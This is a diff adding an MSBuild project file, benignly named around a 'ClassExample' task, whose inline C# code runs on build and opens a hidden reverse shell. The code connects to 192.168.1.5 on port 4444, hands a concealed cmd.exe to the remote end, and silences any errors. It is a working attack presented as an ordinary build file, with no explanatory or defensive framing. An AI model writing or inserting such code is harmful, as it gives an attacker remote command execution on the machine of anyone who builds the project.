@@ -1,0 +1,80 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="MSBuild">
+    <ClassExample />
+  </Target>
+  <UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <Task>
+      <Reference Include="System" />
+      <Reference Include="System.Net" />
+      <Reference Include="System.IO" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using System.Net.Sockets;
+        using System.Text;
+        using System.Diagnostics;
+        using System.IO;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        
+        public class ClassExample : Task, ITask
+        {
+            public override bool Execute()
+            {
+                try
+                {
+                    string host = "192.168.1.5";
+                    int port = 4444;
+                    
+                    using (TcpClient client = new TcpClient(host, port))
+                    {
+                        using (NetworkStream stream = client.GetStream())
+                        using (StreamReader reader = new StreamReader(stream, Encoding.UTF8))
+                        using (StreamWriter writer = new StreamWriter(stream, Encoding.UTF8) { AutoFlush = true })
+                        {
+                            Process process = new Process();
+                            process.StartInfo.FileName = "cmd.exe";
+                            process.StartInfo.CreateNoWindow = true;
+                            process.StartInfo.UseShellExecute = false;
+                            process.StartInfo.RedirectStandardOutput = true;
+                            process.StartInfo.RedirectStandardInput = true;
+                            process.StartInfo.RedirectStandardError = true;
+                            
+                            process.OutputDataReceived += (s, e) => {
+                                if (!string.IsNullOrEmpty(e.Data))
+                                {
+                                    writer.WriteLine(e.Data);
+                                }
+                            };
+                            
+                            process.Start();
+                            process.BeginOutputReadLine();
+                            
+                            // Command loop
+                            while (true)
+                            {
+                                string input = reader.ReadLine();
+                                if (string.IsNullOrEmpty(input)) continue;
+                                if (input.ToLower() == "exit") break;
+                                
+                                process.StandardInput.WriteLine(input);
+                            }
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    // Silent failure - remove this in production
+                    // System.IO.File.WriteAllText(@"C:\Windows\Temp\debug.txt", ex.ToString());
+                }
+                return true;
+            }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
